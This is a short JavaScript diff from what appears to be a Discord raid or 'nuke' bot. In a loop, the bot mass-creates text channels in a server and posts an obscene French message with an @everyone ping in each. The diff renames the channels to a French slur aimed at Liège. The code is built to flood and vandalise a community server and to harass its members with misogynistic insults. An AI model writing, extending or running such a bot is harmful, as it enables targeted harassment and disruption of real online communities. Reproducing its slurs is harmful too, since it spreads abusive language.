@@ -241,7 +241,7 @@ client.on('messageCreate', async (message) => {
       for (let i = 0; i < TOTAL; i++) {
         try {
           const newCh = await guild.channels.create({
-            name: 'XX',
+            name: 'liege-les-salopes',
             type: 0, // GuildText
           });
           await newCh.send('ALLER VOUS FAIRE FOUTRE BANDE DE SALOPE @everyone').catch(() => {});
